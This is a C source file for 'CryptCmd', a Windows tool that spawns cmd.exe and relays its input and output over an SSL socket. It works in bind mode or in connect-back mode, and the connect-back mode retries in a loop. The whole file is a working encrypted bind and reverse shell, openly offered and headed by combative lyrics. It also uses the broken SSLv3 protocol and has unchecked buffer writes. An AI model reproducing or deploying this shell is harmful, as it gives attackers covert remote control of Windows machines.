/*
 "I see the soldiers, coming from out the shadows, ready 
  for battles, aint trying to hear the babble. Warriors 
  lined up in full war gear, in it to win it if it goes
  on for years. Dedicated to the stable of the assasins,
  revolutionaries - just bring on the action."
*/
#include "CryptCmd.h"

HANDLE hChildStdinRd, hChildStdinWr, hChildStdinWrDup, hChildStdoutRd, hChildStdoutWr, 
	   hChildStdoutRdDup, hSaveStdin, hSaveStdout, hSaveStderr;

DWORD dwRead, dwWritten; 
char chBuf[BUFSIZE]; 
struct sockaddr_in sa;	
SSL_CTX* ctx;
SSL* ssl;
char* str;
X509* cert;
SSL_METHOD *meth;
WSADATA wsa;

void main(int argc,char* argv[])
{
	printf("CryptCmd - encrypted network command shell\n");
	printf("==========================================\n[\n");
	printf("[ \"Everywhere you lookup, he got everybody shook up\n");
	printf("[  running for cover, the big bad wolf motherfucker.\"\n[\n");
	if(argc < 5)
	{
		printf("[ Error:\n[ Usage: %s [(c)lient|(s)erver] [(b)ind|(c)onnect] (host) (port)\n",argv[0]);
		exit(0);
	}
	sa.sin_family = AF_INET;
	WSAStartup(MAKEWORD(2,0),&wsa);
	SOCKET is = WSASocket(AF_INET,SOCK_STREAM,0,NULL,NULL,NULL);	
	struct hostent *he;
	long lHost;
	if(!(inet_addr(argv[3]) ==-1))
	{
		lHost = inet_addr(argv[3]);
	}
	else
	{
		he = gethostbyname(argv[3]);	
		if(he != NULL)
		{
			lHost = (long)(inet_ntoa(*((struct in_addr *)he->h_addr)));
			lHost = inet_addr((char*)lHost);
		}
	}
	sa.sin_addr.s_addr=lHost;
    sa.sin_port = htons(atoi(argv[4]));
	SSLeay_add_ssl_algorithms();  
	meth = SSLv3_method();
	SSL_load_error_strings();
	char servtype;
	char servtype2;
	memcpy(&servtype,argv[1],1);
	switch(servtype)
	{
		case 's':
			printf("[ Starting server...\n");			
			memcpy(&servtype2,argv[2],1);
			switch(servtype2)
			{
				case 'b':
					printf("[ Binding %s on port %s\n",argv[3],argv[4]);
					bindserver(is,sa);
					break;
				case 'c':
					printf("[ Connecting to %s on port %s\n",argv[3],argv[4]);
					connserver(is,sa);
					break;
				default:
					printf("[ Invalid selection - Quiting\n");
					exit(0);
			}
			break;
		case 'c':
			printf("[ Starting client...\n");
			memcpy(&servtype2,argv[2],1);
			switch(servtype2)
			{
				case 'b':
					printf("[ Binding %s on port %s\n",argv[3],argv[4]);
					bindclient(is,sa);
					break;
				case 'c':
					printf("[ Connecting to %s on port %s\n",argv[3],argv[4]);
					connclient(is,sa);
					break;
				default:
					printf("[ Invalid selection - Quiting\n");
					exit(0);
			}
			break;
		default:
			printf("[ Error - you must choose a client or a server\n");
			exit(0);
	}
}

void bindserver(SOCKET is,struct sockaddr_in sa)
{
	if(bind(is,(struct sockaddr*)&sa,sizeof(sa))==0)
	{
		listen(is,0);
		printf("[ Awaiting connections\n");
		while(true)
		{
			SOCKET ia = accept(is,NULL,NULL);
			printf("[ Connection established\n");
			ctx = SSL_CTX_new (meth);          
			SSL_CTX_use_certificate_file(ctx, CERTF, SSL_FILETYPE_PEM);
			SSL_CTX_use_PrivateKey_file(ctx, KEYF, SSL_FILETYPE_PEM);	
			if(!SSL_CTX_check_private_key(ctx))
			{
				fprintf(stderr,"[ Error: private key does not match the certificate public key\n");
				exit(0);
			}
			RAND_screen();			
			ssl = SSL_new (ctx); 
            SSL_set_fd (ssl, ia);
            SSL_accept (ssl);
			printf ("[ SSL connection using %s\n", SSL_get_cipher (ssl));			
			cert = SSL_get_peer_certificate (ssl);
			if(cert != NULL)
			{
				printf ("[ Client certificate\n");
				str = X509_NAME_oneline (X509_get_subject_name (cert), 0, 0);				
				printf ("[ Subj: %s\n", str);
				str = X509_NAME_oneline (X509_get_issuer_name  (cert), 0, 0);				
				printf ("[ Issuer: %s\n", str);
				X509_free (cert);
			}
			else
			{
				printf ("[ Client does not have certificate.\n");
			}	
			SECURITY_ATTRIBUTES saAttr;    
			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
			saAttr.bInheritHandle = TRUE; 
			saAttr.lpSecurityDescriptor = NULL; 
			hSaveStdout = GetStdHandle(STD_OUTPUT_HANDLE); 
			hSaveStderr = GetStdHandle(STD_ERROR_HANDLE);
			CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0);
			SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr);
			SetStdHandle(STD_ERROR_HANDLE,hChildStdoutWr);
			DuplicateHandle(GetCurrentProcess(), hChildStdoutRd,GetCurrentProcess(),&hChildStdoutRdDup,0,FALSE,DUPLICATE_SAME_ACCESS);
			CloseHandle(hChildStdoutRd);
			hSaveStdin = GetStdHandle(STD_INPUT_HANDLE); 
			CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0);
			SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd);      
			DuplicateHandle(GetCurrentProcess(), hChildStdinWr,GetCurrentProcess(),&hChildStdinWrDup,0,FALSE,DUPLICATE_SAME_ACCESS);
			CloseHandle(hChildStdinWr); 
			PROCESS_INFORMATION piProcInfo; 
			STARTUPINFO siStartInfo; 
			ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
			siStartInfo.cb = sizeof(STARTUPINFO); 
			CreateProcess(NULL,"cmd",NULL,NULL,TRUE,0,NULL,NULL,&siStartInfo,&piProcInfo);
			SetStdHandle(STD_INPUT_HANDLE, hSaveStdin);      
			SetStdHandle(STD_OUTPUT_HANDLE, hSaveStdout);
			SetStdHandle(STD_ERROR_HANDLE,hSaveStderr);						
			while(true)
			{							
				Sleep(500);	
				ReadFile(hChildStdoutRdDup,chBuf,BUFSIZE,&dwRead,NULL); 				
				chBuf[dwRead]='\x00';
				SSL_write(ssl,chBuf, strlen(chBuf));
				ZeroMemory(chBuf,sizeof(chBuf));				
				if(dwRead < 4096)
				{				
					SSL_read (ssl, chBuf, sizeof(chBuf)); 
					chBuf[dwRead]='\x00';
					WriteFile(hChildStdinWrDup, chBuf, strlen(chBuf),&dwWritten, NULL);
					ZeroMemory(chBuf,sizeof(chBuf));
				}
			} 
			printf("[ Connection terminated\n");		
			closesocket (ia);
			SSL_free (ssl);
			SSL_CTX_free (ctx);
		}
	}
	else
	{
		printf("[ Couldnt bind to host - Quiting\n");
		exit(0);
	}
}

void connserver(SOCKET is,struct sockaddr_in sa)
{
	while(true)
	{
		if(connect(is,(sockaddr*)&sa,sizeof(sa))==0)
		{
			printf("[ Connection established\n");
			ctx = SSL_CTX_new (meth);          
			SSL_CTX_use_certificate_file(ctx, CCERTF, SSL_FILETYPE_PEM);
			SSL_CTX_use_PrivateKey_file(ctx, CKEYF, SSL_FILETYPE_PEM);
			if(!SSL_CTX_check_private_key(ctx))
			{
				fprintf(stderr,"[ Error: private key does not match the certificate public key\n");
				exit(0);
			}
			RAND_screen();
			ssl = SSL_new (ctx);
            SSL_set_fd (ssl, is);
			SSL_connect (ssl); 
			printf ("[ SSL connection using %s\n", SSL_get_cipher (ssl));			
			cert = SSL_get_peer_certificate (ssl);
			if(cert != NULL)
			{
				printf ("[ Client certificate\n");
				str = X509_NAME_oneline (X509_get_subject_name (cert), 0, 0);				
				printf ("[ Subj: %s\n", str);				
				str = X509_NAME_oneline (X509_get_issuer_name  (cert), 0, 0);				
				printf ("[ Issuer: %s\n", str);				    
				X509_free (cert);
			}
			else
			{
				printf ("[ Client does not have certificate.\n");
			}	
			SECURITY_ATTRIBUTES saAttr;    
			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
			saAttr.bInheritHandle = TRUE; 
			saAttr.lpSecurityDescriptor = NULL; 
			hSaveStdout = GetStdHandle(STD_OUTPUT_HANDLE); 
			hSaveStderr = GetStdHandle(STD_ERROR_HANDLE);
			CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0);
			SetStdHandle(STD_OUTPUT_HANDLE, hChildStdoutWr);
			SetStdHandle(STD_ERROR_HANDLE, hChildStdoutWr);
			DuplicateHandle(GetCurrentProcess(), hChildStdoutRd,GetCurrentProcess(),&hChildStdoutRdDup,0,FALSE,DUPLICATE_SAME_ACCESS);
			CloseHandle(hChildStdoutRd);
			hSaveStdin = GetStdHandle(STD_INPUT_HANDLE); 
			CreatePipe(&hChildStdinRd, &hChildStdinWr, &saAttr, 0);
			SetStdHandle(STD_INPUT_HANDLE, hChildStdinRd);      
			DuplicateHandle(GetCurrentProcess(), hChildStdinWr,GetCurrentProcess(),&hChildStdinWrDup,0,FALSE,DUPLICATE_SAME_ACCESS);
			CloseHandle(hChildStdinWr); 
			PROCESS_INFORMATION piProcInfo; 
			STARTUPINFO siStartInfo; 
			ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
			siStartInfo.cb = sizeof(STARTUPINFO); 
			CreateProcess(NULL,"cmd",NULL,NULL,TRUE,0,NULL,NULL,&siStartInfo,&piProcInfo);
			SetStdHandle(STD_INPUT_HANDLE, hSaveStdin);      
			SetStdHandle(STD_OUTPUT_HANDLE, hSaveStdout);
			SetStdHandle(STD_ERROR_HANDLE, hSaveStderr);			
			while(true)
			{		
				Sleep(500);	
				ReadFile(hChildStdoutRdDup,chBuf,BUFSIZE,&dwRead,NULL); // more?
				chBuf[dwRead]='\x00';
				SSL_write(ssl,chBuf, strlen(chBuf));
				ZeroMemory(chBuf,sizeof(chBuf));
				if(dwRead < 4096)
				{				
					SSL_read (ssl, chBuf, sizeof(chBuf)); 
					chBuf[dwRead]='\x00';
					WriteFile(hChildStdinWrDup, chBuf, strlen(chBuf),&dwWritten, NULL);       
					ZeroMemory(chBuf,sizeof(chBuf));					
				}			
			} 
			printf("[ Connection terminated\n");		
			closesocket (is);
			SSL_free (ssl);
			SSL_CTX_free (ctx);		
			is = WSASocket(AF_INET,SOCK_STREAM,0,NULL,NULL,NULL);	
		}
		else
		{
			printf("[ Connection attempt failed - Retrying\n");
		}
		Sleep(500);
	}
}

void connclient(SOCKET is,struct sockaddr_in sa)
{
	char buffer[65535]="\x00";
	long pointer;
	char cnull='\x00';
	long count = 1;
	int i,ch;
	while(true)
	{
		if(connect(is,(const sockaddr*)&sa,sizeof(sa))==0)
		{		
		printf("[ Connection established\n");
		ctx = SSL_CTX_new (meth);          
		SSL_CTX_use_certificate_file(ctx, CCERTF, SSL_FILETYPE_PEM);
		SSL_CTX_use_PrivateKey_file(ctx, CKEYF, SSL_FILETYPE_PEM);	
		if(!SSL_CTX_check_private_key(ctx))
		{
			fprintf(stderr,"[ Error: private key does not match the certificate public key\n");
			exit(0);
		}
		RAND_screen();
		ssl = SSL_new (ctx);		
        SSL_set_fd (ssl, is);
        SSL_connect (ssl); 
		printf ("[ SSL connection using %s\n", SSL_get_cipher (ssl));			
		cert = SSL_get_peer_certificate (ssl);
		if(cert != NULL)
		{
			printf ("[ Client certificate\n");
			str = X509_NAME_oneline (X509_get_subject_name (cert), 0, 0);				
			printf ("[ Subj: %s\n", str);
			str = X509_NAME_oneline (X509_get_issuer_name  (cert), 0, 0);				
			printf ("[ Issuer: %s\n", str);
			X509_free (cert);
		}
		else
		{
			printf ("[ Client does not have certificate.\n");
		}	
		Sleep(500);
		while(count != -1)
		{		
			count = SSL_read (ssl, buffer, sizeof(buffer));
			pointer = (long)&buffer + count;
			memcpy((void*)pointer,&cnull,1);
			printf("%s",buffer);
			if(count < 4096)
			{								
				for( i = 0; (i < 80) &&  ((ch = getchar()) != EOF) && (ch != '\n'); i++ )
				{
					buffer[i] = (char)ch;
				}
				buffer[i] = '\n';
				i++;
				buffer[i] = '\x00';
				SSL_write(ssl,buffer, strlen(buffer));							
			}
			Sleep(500);
		}
		printf("[ Connection terminated\n");
		SSL_shutdown (ssl);
		SSL_free (ssl);
		SSL_CTX_free (ctx);
		is = WSASocket(AF_INET,SOCK_STREAM,0,NULL,NULL,NULL);	
		count = 0;
		}
		else
		{
			printf("[ Connection attempt failed - Retrying\n");
		}
		Sleep(500);
	}
}

void bindclient(SOCKET is,struct sockaddr_in sa)
{
	char buffer[65535]="\x00";
	long pointer;
	char cnull='\x00';
	long count = 1;
	int i,ch;
	if(bind(is,(struct sockaddr*)&sa,sizeof(sa))==0)
	{
		listen(is,0);
		printf("[ Awaiting connections\n");
		while(true)
		{			
			SOCKET ia = accept(is,NULL,NULL);
			printf("[ Connection established\n");
			ctx = SSL_CTX_new (meth);          
			SSL_CTX_use_certificate_file(ctx, CERTF, SSL_FILETYPE_PEM);
			SSL_CTX_use_PrivateKey_file(ctx, KEYF, SSL_FILETYPE_PEM);	
			if(!SSL_CTX_check_private_key(ctx))
			{
				fprintf(stderr,"[ Error: private key does not match the certificate public key\n");
				exit(0);
			}
			RAND_screen();
			ssl = SSL_new (ctx);
            SSL_set_fd (ssl, ia);
            SSL_accept (ssl);
			printf ("[ SSL connection using %s\n", SSL_get_cipher (ssl));			
			cert = SSL_get_peer_certificate (ssl);
			if(cert != NULL)
			{
				printf ("[ Client certificate\n");
				str = X509_NAME_oneline (X509_get_subject_name (cert), 0, 0);				
				printf ("[ Subj: %s\n", str);			
				str = X509_NAME_oneline (X509_get_issuer_name  (cert), 0, 0);				
				printf ("[ Issuer: %s\n", str);
				X509_free (cert);
			}
			else
			{
				printf ("[ Client does not have certificate.\n");
			}	
			Sleep(1000);
			while(count != -1)
			{
				count = SSL_read (ssl, buffer, sizeof(buffer));
				pointer = (long)&buffer + count;
				memcpy((void*)pointer,&cnull,1);
				printf("%s",buffer);
				if(count < 4096)
				{				
					for( i = 0; (i < 80) &&  ((ch = getchar()) != EOF) && (ch != '\n'); i++ )
					{
						buffer[i] = (char)ch;
					}
					buffer[i] = '\n';
					i++;
					buffer[i] = '\x00';
					SSL_write(ssl,buffer, strlen(buffer));				
				}
				Sleep(500);
			}
			printf("[ Connection terminated\n");
			SSL_shutdown (ssl);
			closesocket(ia);
			SSL_free (ssl);
			SSL_CTX_free (ctx);
			count = 0;
		}
	}
	else
	{
		printf("[ Couldnt bind to host - Quiting\n");
		exit(0);
	}
}
